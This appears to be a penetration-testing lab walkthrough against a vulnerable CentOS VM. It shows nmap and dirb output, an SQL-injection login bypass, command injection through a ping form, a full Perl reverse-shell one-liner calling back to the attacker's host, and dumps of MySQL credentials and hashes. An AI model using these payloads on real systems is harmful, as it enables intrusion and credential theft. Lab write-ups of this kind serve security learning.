Reconnaissance:

Started by finding the host on the network.

nmap -sS -O 192.168.118.0/24

192.168.118.181 looks guilty.

Enumeration:

root@kali:~# nmap -A -T4 192.168.118.181

Starting Nmap 7.40 ( https://nmap.org ) at 2017-05-19 10:28 EDT
Nmap scan report for 192.168.118.181
Host is up (0.00042s latency).
Not shown: 994 closed ports
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 3.9p1 (protocol 1.99)
| ssh-hostkey:
|   1024 8f:3e:8b:1e:58:63:fe:cf:27:a3:18:09:3b:52:cf:72 (RSA1)
|   1024 34:6b:45:3d:ba:ce:ca:b2:53:55:ef:1e:43:70:38:36 (DSA)
|_  1024 68:4d:8c:bb:b6:5a:bd:79:71:b8:71:47:ea:00:42:61 (RSA)
|_sshv1: Server supports SSHv1
80/tcp   open  http     Apache httpd 2.0.52 ((CentOS))
|_http-server-header: Apache/2.0.52 (CentOS)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
111/tcp  open  rpcbind  2 (RPC #100000)
| rpcinfo:
|   program version   port/proto  service
|   100000  2            111/tcp  rpcbind
|   100000  2            111/udp  rpcbind
|   100024  1            750/udp  status
|_  100024  1            753/tcp  status
443/tcp  open  ssl/http Apache httpd 2.0.52 ((CentOS))
|_http-server-header: Apache/2.0.52 (CentOS)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Not valid before: 2009-10-08T00:10:47
|_Not valid after:  2010-10-08T00:10:47
|_ssl-date: 2017-05-19T11:18:36+00:00; -3h09m45s from scanner time.
| sslv2:
|   SSLv2 supported
|   ciphers:
|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
|     SSL2_RC4_128_EXPORT40_WITH_MD5
|     SSL2_RC4_128_WITH_MD5
|     SSL2_DES_192_EDE3_CBC_WITH_MD5
|     SSL2_RC4_64_WITH_MD5
|     SSL2_DES_64_CBC_WITH_MD5
|_    SSL2_RC2_128_CBC_WITH_MD5
631/tcp  open  ipp      CUPS 1.1
| http-methods:
|_  Potentially risky methods: PUT
|_http-server-header: CUPS/1.1
|_http-title: 403 Forbidden
3306/tcp open  mysql    MySQL (unauthorized)
MAC Address: 00:0C:29:A5:23:B3 (VMware)
Device type: general purpose
Running: Linux 2.6.X
OS CPE: cpe:/o:linux:linux_kernel:2.6
OS details: Linux 2.6.9 - 2.6.30
Network Distance: 1 hop

Host script results:
|_clock-skew: mean: -3h09m45s, deviation: 0s, median: -3h09m45s

TRACEROUTE
HOP RTT     ADDRESS
1   0.42 ms 192.168.118.181

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.05 seconds
root@kali:~#

root@kali:~# dirb http://192.168.118.181

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Fri May 19 10:29:16 2017
URL_BASE: http://192.168.118.181/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://192.168.118.181/ ----
+ http://192.168.118.181/cgi-bin/ (CODE:403|SIZE:291)                                                                  
+ http://192.168.118.181/index.php (CODE:200|SIZE:667)                                                                 
==> DIRECTORY: http://192.168.118.181/manual/                                                                          
+ http://192.168.118.181/usage (CODE:403|SIZE:288)                                                                     

---- Entering directory: http://192.168.118.181/manual/ ----
==> DIRECTORY: http://192.168.118.181/manual/de/                                                                       
==> DIRECTORY: http://192.168.118.181/manual/developer/                                                                
==> DIRECTORY: http://192.168.118.181/manual/en/                                                                       
==> DIRECTORY: http://192.168.118.181/manual/faq/                                                                      
==> DIRECTORY: http://192.168.118.181/manual/fr/                                                                       
==> DIRECTORY: http://192.168.118.181/manual/howto/                                                                    
==> DIRECTORY: http://192.168.118.181/manual/images/                                                                   
+ http://192.168.118.181/manual/index.html (CODE:200|SIZE:7234)                                                        
==> DIRECTORY: http://192.168.118.181/manual/ja/                                                                       
==> DIRECTORY: http://192.168.118.181/manual/ko/                                                                       
+ http://192.168.118.181/manual/LICENSE (CODE:200|SIZE:11358)                                                          
==> DIRECTORY: http://192.168.118.181/manual/misc/                                                                     
==> DIRECTORY: http://192.168.118.181/manual/mod/                                                                      
==> DIRECTORY: http://192.168.118.181/manual/programs/                                                                 
==> DIRECTORY: http://192.168.118.181/manual/ru/                                                                       
==> DIRECTORY: http://192.168.118.181/manual/ssl/                                                                      
==> DIRECTORY: http://192.168.118.181/manual/style/                                                                    

---- Entering directory: http://192.168.118.181/manual/de/ ----
+ http://192.168.118.181/manual/de/de (CODE:301|SIZE:321)                                                              
==> DIRECTORY: http://192.168.118.181/manual/de/developer/                                                             
+ http://192.168.118.181/manual/de/en (CODE:301|SIZE:321)                                                              
==> DIRECTORY: http://192.168.118.181/manual/de/faq/                                                                   
+ http://192.168.118.181/manual/de/fr (CODE:301|SIZE:321)                                                              
==> DIRECTORY: http://192.168.118.181/manual/de/howto/                                                                 
==> DIRECTORY: http://192.168.118.181/manual/de/images/                                                                
+ http://192.168.118.181/manual/de/index.html (CODE:200|SIZE:7317)                                                     
+ http://192.168.118.181/manual/de/ja (CODE:301|SIZE:321)                                                              
+ http://192.168.118.181/manual/de/ko (CODE:301|SIZE:321)                                                              
+ http://192.168.118.181/manual/de/LICENSE (CODE:200|SIZE:11358)                                                       
==> DIRECTORY: http://192.168.118.181/manual/de/misc/                                                                  
==> DIRECTORY: http://192.168.118.181/manual/de/mod/                                                                   
==> DIRECTORY: http://192.168.118.181/manual/de/programs/                                                              
+ http://192.168.118.181/manual/de/ru (CODE:301|SIZE:321)                                                              
==> DIRECTORY: http://192.168.118.181/manual/de/ssl/                                                                   
==> DIRECTORY: http://192.168.118.181/manual/de/style/                                                                 

---- Entering directory: http://192.168.118.181/manual/developer/ ----
+ http://192.168.118.181/manual/developer/index.html (CODE:200|SIZE:4770)                                              

---- Entering directory: http://192.168.118.181/manual/en/ ----
+ http://192.168.118.181/manual/en/de (CODE:301|SIZE:321)                                                              
==> DIRECTORY: http://192.168.118.181/manual/en/developer/                                                             
+ http://192.168.118.181/manual/en/en (CODE:301|SIZE:321)                                                              
==> DIRECTORY: http://192.168.118.181/manual/en/faq/                                                                   
+ http://192.168.118.181/manual/en/fr (CODE:301|SIZE:321)                                                              
==> DIRECTORY: http://192.168.118.181/manual/en/howto/                                                                 
==> DIRECTORY: http://192.168.118.181/manual/en/images/                                                                
+ http://192.168.118.181/manual/en/index.html (CODE:200|SIZE:7234)                                                     
+ http://192.168.118.181/manual/en/ja (CODE:301|SIZE:321)                                                              
+ http://192.168.118.181/manual/en/ko (CODE:301|SIZE:321)                                                              
+ http://192.168.118.181/manual/en/LICENSE (CODE:200|SIZE:11358)                                                       
==> DIRECTORY: http://192.168.118.181/manual/en/misc/                                                                  
==> DIRECTORY: http://192.168.118.181/manual/en/mod/                                                                   
==> DIRECTORY: http://192.168.118.181/manual/en/programs/                                                              
+ http://192.168.118.181/manual/en/ru (CODE:301|SIZE:321)                                                              
==> DIRECTORY: http://192.168.118.181/manual/en/ssl/                                                                   
==> DIRECTORY: http://192.168.118.181/manual/en/style/                                                                 

---- Entering directory: http://192.168.118.181/manual/faq/ ----
+ http://192.168.118.181/manual/faq/index.html (CODE:200|SIZE:3564)                                                    

---- Entering directory: http://192.168.118.181/manual/fr/ ----
+ http://192.168.118.181/manual/fr/de (CODE:301|SIZE:321)                                                              
==> DIRECTORY: http://192.168.118.181/manual/fr/developer/                                                             
+ http://192.168.118.181/manual/fr/en (CODE:301|SIZE:321)                                                              
==> DIRECTORY: http://192.168.118.181/manual/fr/faq/                                                                   
+ http://192.168.118.181/manual/fr/fr (CODE:301|SIZE:321)                                                              
==> DIRECTORY: http://192.168.118.181/manual/fr/howto/                                                                 
==> DIRECTORY: http://192.168.118.181/manual/fr/images/                                                                
+ http://192.168.118.181/manual/fr/index.html (CODE:200|SIZE:7234)                                                     
+ http://192.168.118.181/manual/fr/ja (CODE:301|SIZE:321)                                                              
+ http://192.168.118.181/manual/fr/ko (CODE:301|SIZE:321)                                                              
+ http://192.168.118.181/manual/fr/LICENSE (CODE:200|SIZE:11358)                                                       
==> DIRECTORY: http://192.168.118.181/manual/fr/misc/                                                                  
==> DIRECTORY: http://192.168.118.181/manual/fr/mod/                                                                   
==> DIRECTORY: http://192.168.118.181/manual/fr/programs/                                                              
+ http://192.168.118.181/manual/fr/ru (CODE:301|SIZE:321)                                                              
==> DIRECTORY: http://192.168.118.181/manual/fr/ssl/                                                                   
==> DIRECTORY: http://192.168.118.181/manual/fr/style/                                                                 

---- Entering directory: http://192.168.118.181/manual/howto/ ----
+ http://192.168.118.181/manual/howto/index.html (CODE:200|SIZE:5685)                                                  

---- Entering directory: http://192.168.118.181/manual/images/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://192.168.118.181/manual/ja/ ----
+ http://192.168.118.181/manual/ja/de (CODE:301|SIZE:321)                                                              
==> DIRECTORY: http://192.168.118.181/manual/ja/developer/                                                             
+ http://192.168.118.181/manual/ja/en (CODE:301|SIZE:321)                                                              
==> DIRECTORY: http://192.168.118.181/manual/ja/faq/                                                                   
+ http://192.168.118.181/manual/ja/fr (CODE:301|SIZE:321)                                                              
==> DIRECTORY: http://192.168.118.181/manual/ja/howto/                                                                 
==> DIRECTORY: http://192.168.118.181/manual/ja/images/                                                                
+ http://192.168.118.181/manual/ja/index.html (CODE:200|SIZE:7227)                                                     
+ http://192.168.118.181/manual/ja/ja (CODE:301|SIZE:321)                                                              
+ http://192.168.118.181/manual/ja/ko (CODE:301|SIZE:321)                                                              
+ http://192.168.118.181/manual/ja/LICENSE (CODE:200|SIZE:11358)                                                       
==> DIRECTORY: http://192.168.118.181/manual/ja/misc/                                                                  
==> DIRECTORY: http://192.168.118.181/manual/ja/mod/                                                                   
==> DIRECTORY: http://192.168.118.181/manual/ja/programs/                                                              
+ http://192.168.118.181/manual/ja/ru (CODE:301|SIZE:321)                                                              
==> DIRECTORY: http://192.168.118.181/manual/ja/ssl/                                                                   
==> DIRECTORY: http://192.168.118.181/manual/ja/style/                                                                 

---- Entering directory: http://192.168.118.181/manual/ko/ ----
+ http://192.168.118.181/manual/ko/de (CODE:301|SIZE:321)                                                              
==> DIRECTORY: http://192.168.118.181/manual/ko/developer/                                                             
+ http://192.168.118.181/manual/ko/en (CODE:301|SIZE:321)                                                              
==> DIRECTORY: http://192.168.118.181/manual/ko/faq/                                                                   
+ http://192.168.118.181/manual/ko/fr (CODE:301|SIZE:321)                                                              
==> DIRECTORY: http://192.168.118.181/manual/ko/howto/                                                                 
==> DIRECTORY: http://192.168.118.181/manual/ko/images/                                                                
+ http://192.168.118.181/manual/ko/index.html (CODE:200|SIZE:6954)                                                     
+ http://192.168.118.181/manual/ko/ja (CODE:301|SIZE:321)                                                              
+ http://192.168.118.181/manual/ko/ko (CODE:301|SIZE:321)                                                              
+ http://192.168.118.181/manual/ko/LICENSE (CODE:200|SIZE:11358)                                                       
==> DIRECTORY: http://192.168.118.181/manual/ko/misc/                                                                  
==> DIRECTORY: http://192.168.118.181/manual/ko/mod/                                                                   
==> DIRECTORY: http://192.168.118.181/manual/ko/programs/                                                              
+ http://192.168.118.181/manual/ko/ru (CODE:301|SIZE:321)                                                              
==> DIRECTORY: http://192.168.118.181/manual/ko/ssl/                                                                   
==> DIRECTORY: http://192.168.118.181/manual/ko/style/                                                                 

---- Entering directory: http://192.168.118.181/manual/misc/ ----
+ http://192.168.118.181/manual/misc/index.html (CODE:200|SIZE:5491)                                                   

---- Entering directory: http://192.168.118.181/manual/mod/ ----
+ http://192.168.118.181/manual/mod/index.html (CODE:200|SIZE:13437)                                                   

---- Entering directory: http://192.168.118.181/manual/programs/ ----
+ http://192.168.118.181/manual/programs/index.html (CODE:200|SIZE:4664)                                               

---- Entering directory: http://192.168.118.181/manual/ru/ ----
+ http://192.168.118.181/manual/ru/de (CODE:301|SIZE:321)                                                              
==> DIRECTORY: http://192.168.118.181/manual/ru/developer/                                                             
+ http://192.168.118.181/manual/ru/en (CODE:301|SIZE:321)                                                              
==> DIRECTORY: http://192.168.118.181/manual/ru/faq/                                                                   
+ http://192.168.118.181/manual/ru/fr (CODE:301|SIZE:321)                                                              
==> DIRECTORY: http://192.168.118.181/manual/ru/howto/                                                                 
==> DIRECTORY: http://192.168.118.181/manual/ru/images/                                                                
+ http://192.168.118.181/manual/ru/index.html (CODE:200|SIZE:7277)                                                     
+ http://192.168.118.181/manual/ru/ja (CODE:301|SIZE:321)                                                              
+ http://192.168.118.181/manual/ru/ko (CODE:301|SIZE:321)                                                              
+ http://192.168.118.181/manual/ru/LICENSE (CODE:200|SIZE:11358)                                                       
==> DIRECTORY: http://192.168.118.181/manual/ru/misc/                                                                  
==> DIRECTORY: http://192.168.118.181/manual/ru/mod/                                                                   
==> DIRECTORY: http://192.168.118.181/manual/ru/programs/                                                              
+ http://192.168.118.181/manual/ru/ru (CODE:301|SIZE:321)                                                              
==> DIRECTORY: http://192.168.118.181/manual/ru/ssl/                                                                   
==> DIRECTORY: http://192.168.118.181/manual/ru/style/                                                                 

---- Entering directory: http://192.168.118.181/manual/ssl/ ----
+ http://192.168.118.181/manual/ssl/index.html (CODE:200|SIZE:3988)                                                    

---- Entering directory: http://192.168.118.181/manual/style/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://192.168.118.181/manual/de/developer/ ----
+ http://192.168.118.181/manual/de/developer/index.html (CODE:200|SIZE:4770)                                           

---- Entering directory: http://192.168.118.181/manual/de/faq/ ----
+ http://192.168.118.181/manual/de/faq/index.html (CODE:200|SIZE:3564)                                                 

---- Entering directory: http://192.168.118.181/manual/de/howto/ ----
+ http://192.168.118.181/manual/de/howto/index.html (CODE:200|SIZE:5685)                                               

---- Entering directory: http://192.168.118.181/manual/de/images/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://192.168.118.181/manual/de/misc/ ----
+ http://192.168.118.181/manual/de/misc/index.html (CODE:200|SIZE:5491)                                                

---- Entering directory: http://192.168.118.181/manual/de/mod/ ----
+ http://192.168.118.181/manual/de/mod/index.html (CODE:200|SIZE:13561)                                                

---- Entering directory: http://192.168.118.181/manual/de/programs/ ----
+ http://192.168.118.181/manual/de/programs/index.html (CODE:200|SIZE:4664)                                            

---- Entering directory: http://192.168.118.181/manual/de/ssl/ ----
+ http://192.168.118.181/manual/de/ssl/index.html (CODE:200|SIZE:3988)                                                 

---- Entering directory: http://192.168.118.181/manual/de/style/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://192.168.118.181/manual/en/developer/ ----
+ http://192.168.118.181/manual/en/developer/index.html (CODE:200|SIZE:4770)                                           

---- Entering directory: http://192.168.118.181/manual/en/faq/ ----
+ http://192.168.118.181/manual/en/faq/index.html (CODE:200|SIZE:3564)                                                 

---- Entering directory: http://192.168.118.181/manual/en/howto/ ----
+ http://192.168.118.181/manual/en/howto/index.html (CODE:200|SIZE:5685)                                               

---- Entering directory: http://192.168.118.181/manual/en/images/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://192.168.118.181/manual/en/misc/ ----
+ http://192.168.118.181/manual/en/misc/index.html (CODE:200|SIZE:5491)                                                

---- Entering directory: http://192.168.118.181/manual/en/mod/ ----
+ http://192.168.118.181/manual/en/mod/index.html (CODE:200|SIZE:13437)                                                

---- Entering directory: http://192.168.118.181/manual/en/programs/ ----
+ http://192.168.118.181/manual/en/programs/index.html (CODE:200|SIZE:4664)                                            

---- Entering directory: http://192.168.118.181/manual/en/ssl/ ----
+ http://192.168.118.181/manual/en/ssl/index.html (CODE:200|SIZE:3988)                                                 

---- Entering directory: http://192.168.118.181/manual/en/style/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://192.168.118.181/manual/fr/developer/ ----
+ http://192.168.118.181/manual/fr/developer/index.html (CODE:200|SIZE:4770)                                           

---- Entering directory: http://192.168.118.181/manual/fr/faq/ ----
+ http://192.168.118.181/manual/fr/faq/index.html (CODE:200|SIZE:3564)                                                 

---- Entering directory: http://192.168.118.181/manual/fr/howto/ ----
+ http://192.168.118.181/manual/fr/howto/index.html (CODE:200|SIZE:5685)                                               

---- Entering directory: http://192.168.118.181/manual/fr/images/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://192.168.118.181/manual/fr/misc/ ----
+ http://192.168.118.181/manual/fr/misc/index.html (CODE:200|SIZE:5491)                                                

---- Entering directory: http://192.168.118.181/manual/fr/mod/ ----
+ http://192.168.118.181/manual/fr/mod/index.html (CODE:200|SIZE:13437)                                                

---- Entering directory: http://192.168.118.181/manual/fr/programs/ ----
+ http://192.168.118.181/manual/fr/programs/index.html (CODE:200|SIZE:4664)                                            

---- Entering directory: http://192.168.118.181/manual/fr/ssl/ ----
+ http://192.168.118.181/manual/fr/ssl/index.html (CODE:200|SIZE:3988)                                                 

---- Entering directory: http://192.168.118.181/manual/fr/style/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://192.168.118.181/manual/ja/developer/ ----
+ http://192.168.118.181/manual/ja/developer/index.html (CODE:200|SIZE:4770)                                           

---- Entering directory: http://192.168.118.181/manual/ja/faq/ ----
+ http://192.168.118.181/manual/ja/faq/index.html (CODE:200|SIZE:3564)                                                 

---- Entering directory: http://192.168.118.181/manual/ja/howto/ ----
+ http://192.168.118.181/manual/ja/howto/index.html (CODE:200|SIZE:5607)                                               

---- Entering directory: http://192.168.118.181/manual/ja/images/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://192.168.118.181/manual/ja/misc/ ----
+ http://192.168.118.181/manual/ja/misc/index.html (CODE:200|SIZE:5491)                                                

---- Entering directory: http://192.168.118.181/manual/ja/mod/ ----
+ http://192.168.118.181/manual/ja/mod/index.html (CODE:200|SIZE:13298)                                                

---- Entering directory: http://192.168.118.181/manual/ja/programs/ ----
+ http://192.168.118.181/manual/ja/programs/index.html (CODE:200|SIZE:4664)                                            

---- Entering directory: http://192.168.118.181/manual/ja/ssl/ ----
+ http://192.168.118.181/manual/ja/ssl/index.html (CODE:200|SIZE:3957)                                                 

---- Entering directory: http://192.168.118.181/manual/ja/style/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://192.168.118.181/manual/ko/developer/ ----
+ http://192.168.118.181/manual/ko/developer/index.html (CODE:200|SIZE:4770)                                           

---- Entering directory: http://192.168.118.181/manual/ko/faq/ ----
+ http://192.168.118.181/manual/ko/faq/index.html (CODE:200|SIZE:3371)                                                 

---- Entering directory: http://192.168.118.181/manual/ko/howto/ ----
+ http://192.168.118.181/manual/ko/howto/index.html (CODE:200|SIZE:5299)                                               

---- Entering directory: http://192.168.118.181/manual/ko/images/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://192.168.118.181/manual/ko/misc/ ----
+ http://192.168.118.181/manual/ko/misc/index.html (CODE:200|SIZE:5491)                                                

---- Entering directory: http://192.168.118.181/manual/ko/mod/ ----
+ http://192.168.118.181/manual/ko/mod/index.html (CODE:200|SIZE:12795)                                                

---- Entering directory: http://192.168.118.181/manual/ko/programs/ ----
+ http://192.168.118.181/manual/ko/programs/index.html (CODE:200|SIZE:4543)                                            

---- Entering directory: http://192.168.118.181/manual/ko/ssl/ ----
+ http://192.168.118.181/manual/ko/ssl/index.html (CODE:200|SIZE:3988)                                                 

---- Entering directory: http://192.168.118.181/manual/ko/style/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://192.168.118.181/manual/ru/developer/ ----
+ http://192.168.118.181/manual/ru/developer/index.html (CODE:200|SIZE:4770)                                           

---- Entering directory: http://192.168.118.181/manual/ru/faq/ ----
+ http://192.168.118.181/manual/ru/faq/index.html (CODE:200|SIZE:3564)                                                 

---- Entering directory: http://192.168.118.181/manual/ru/howto/ ----
+ http://192.168.118.181/manual/ru/howto/index.html (CODE:200|SIZE:5685)                                               

---- Entering directory: http://192.168.118.181/manual/ru/images/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://192.168.118.181/manual/ru/misc/ ----
+ http://192.168.118.181/manual/ru/misc/index.html (CODE:200|SIZE:5491)                                                

---- Entering directory: http://192.168.118.181/manual/ru/mod/ ----
+ http://192.168.118.181/manual/ru/mod/index.html (CODE:200|SIZE:13437)                                                

---- Entering directory: http://192.168.118.181/manual/ru/programs/ ----
+ http://192.168.118.181/manual/ru/programs/index.html (CODE:200|SIZE:5016)                                            

---- Entering directory: http://192.168.118.181/manual/ru/ssl/ ----
+ http://192.168.118.181/manual/ru/ssl/index.html (CODE:200|SIZE:3988)                                                 

---- Entering directory: http://192.168.118.181/manual/ru/style/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)

-----------------
END_TIME: Fri May 19 10:33:11 2017
DOWNLOADED: 262884 - FOUND: 102
root@kali:~#

Open up a web browser and check out the webpage.  Looks like a pretty cheezy admin webapp, bet they don't sanitize input.

admin' OR TRUE #

That gets past the "login" page and drops me to a web page that can ping a host on the network.  Again, i'm assuming they are not sanitizing input.

192.168.118.181 && whoami

Yep, I can execute commands.  Time to get a better shell.

netcat is everyone's favorite tools, time to get it ready.

nc -nlvp 443

Now, the server is fairly old.  I'm betting a lot of the common reverse shell stuff isn't installed.

192.168.118.181 && perl --version

This is perl, v5.8.5 built for i386-linux-thread-multi

The lovely people at http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet have a perl reverse shell.  Let's give it a try.

192.168.118.181 && perl -e 'use Socket;$i="192.168.118.180";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

Like magic nc has a shell for us.

sh-3.00$ whoami
apache
sh-3.00$ cat /proc/version
Linux version 2.6.9-55.EL (mockbuild@builder6.centos.org) (gcc version 3.4.6 20060404 (Red Hat 3.4.6-8)) #1 Wed May 2 13:52:16 EDT 2007

sh-3.00$ cat /var/www/html/index.php
<?php
	mysql_connect("localhost", "john", "hiroshima") or die(mysql_error());
	//print "Connected to MySQL<br />";
	mysql_select_db("webapp");

  	if ($POST['uname'] != ""){
		$username = $POST['uname'];
		$password = $POST['psw'];
		$query = "SELECT * FROM users WHERE username = '$username' AND password='$password'";
		//print $query."<br>";
		$result = mysql_query($query);

		$row = mysql_fetch_array($result);
		//print "ID: ".$row['id']."<br />";
	}

 ?>

Look!  A username and password for MySQL!

Let's spawn a python shell, make this shell useable.

python -c 'import pty;pty.spawn("/bin/sh")'

sh-3.00$ mysql -u john -p
mysql -u john -p
Enter password: hiroshima

Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 89 to server version: 4.1.22

Type 'help;' or '\h' for help. Type '\c' to clear the buffer.

mysql> show databases;
show databases;
+----------+
| Database |
+----------+
| mysql    |
| test     |
| webapp   |
+----------+
3 rows in set (0.00 sec)

mysql> use webapp;
use webapp;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables;
show tables;
+------------------+
| Tables_in_webapp |
+------------------+
| users            |
+------------------+
1 row in set (0.00 sec)

mysql> SELECT * FROM users;
SELECT * FROM users;
+------+----------+------------+
| id   | username | password   |
+------+----------+------------+
|    1 | admin    | 5afac8d85f |
|    2 | john     | 66lajGGbla |
+------+----------+------------+
2 rows in set (0.00 sec)

So, that is the webapp users table...but not that useful.

mysql> use mysql;
use mysql;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables;
show tables;
+---------------------------+
| Tables_in_mysql           |
+---------------------------+
| columns_priv              |
| db                        |
| func                      |
| help_category             |
| help_keyword              |
| help_relation             |
| help_topic                |
| host                      |
| tables_priv               |
| time_zone                 |
| time_zone_leap_second     |
| time_zone_name            |
| time_zone_transition      |
| time_zone_transition_type |
| user                      |
+---------------------------+
15 rows in set (0.00 sec)

mysql> SELECT * FROM user;
SELECT * FROM user;
+-----------------------+------+------------------+-------------+-------------+-------------+-------------+-------------+-----------+-------------+---------------+--------------+-----------+------------+-----------------+------------+------------+--------------+------------+-----------------------+------------------+--------------+-----------------+------------------+----------+------------+-------------+--------------+---------------+-------------+-----------------+
| Host                  | User | Password         | Select_priv | Insert_priv | Update_priv | Delete_priv | Create_priv | Drop_priv | Reload_priv | Shutdown_priv | Process_priv | File_priv | Grant_priv | References_priv | Index_priv | Alter_priv | Show_db_priv | Super_priv | Create_tmp_table_priv | Lock_tables_priv | Execute_priv | Repl_slave_priv | Repl_client_priv | ssl_type | ssl_cipher | x509_issuer | x509_subject | max_questions | max_updates | max_connections |
+-----------------------+------+------------------+-------------+-------------+-------------+-------------+-------------+-----------+-------------+---------------+--------------+-----------+------------+-----------------+------------+------------+--------------+------------+-----------------------+------------------+--------------+-----------------+------------------+----------+------------+-------------+--------------+---------------+-------------+-----------------+
| localhost             | root | 5a6914ba69e02807 | Y           | Y           | Y           | Y           | Y           | Y         | Y           | Y             | Y            | Y         | Y          | Y               | Y          | Y          | Y            | Y          | Y                     | Y                | Y            | Y               | Y                |          |            |             |              |             0 |           0 |               0 |
| localhost.localdomain | root | 5a6914ba69e02807 | Y           | Y           | Y           | Y           | Y           | Y         | Y           | Y             | Y            | Y         | Y          | Y               | Y          | Y          | Y            | Y          | Y                     | Y                | Y            | Y               | Y                |          |            |             |              |             0 |           0 |               0 |
| localhost.localdomain |      |                  | N           | N           | N           | N           | N           | N         | N           | N             | N            | N         | N          | N               | N          | N          | N            | N          | N                     | N                | N            | N               | N                |          |            |             |              |             0 |           0 |               0 |
| localhost             |      |                  | N           | N           | N           | N           | N           | N         | N           | N             | N            | N         | N          | N               | N          | N          | N            | N          | N                     | N                | N            | N               | N                |          |            |             |              |             0 |           0 |               0 |
| localhost             | john | 5a6914ba69e02807 | Y           | Y           | Y           | Y           | N           | N         | N           | N             | N            | N         | N          | N               | N          | N          | N            | N          | N                     | N                | N            | N               | N                |          |            |             |              |             0 |           0 |               0 |
+-----------------------+------+------------------+-------------+-------------+-------------+-------------+-------------+-----------+-------------+---------------+--------------+-----------+------------+-----------------+------------+------------+--------------+------------+-----------------------+------------------+--------------+-----------------+------------------+----------+------------+-------------+--------------+---------------+-------------+-----------------+
5 rows in set (0.00 sec)

mysql> exit
exit
Bye
